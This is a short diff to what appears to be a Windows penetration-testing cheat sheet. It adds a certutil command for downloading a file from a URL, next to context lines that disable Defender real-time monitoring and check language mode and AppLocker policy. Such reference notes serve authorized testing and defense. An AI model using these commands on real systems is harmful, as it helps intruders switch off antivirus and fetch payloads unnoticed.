@@ -10,6 +10,11 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 $ExecutionContext.SessionState.LanguageMode
 ```
 
+#### Download with certutil
+```
+certutil -urlcache -split -f <URL>
+```
+
 #### Check if applocker policy is running
 ```
 Get-AppLockerPolicy -Effective
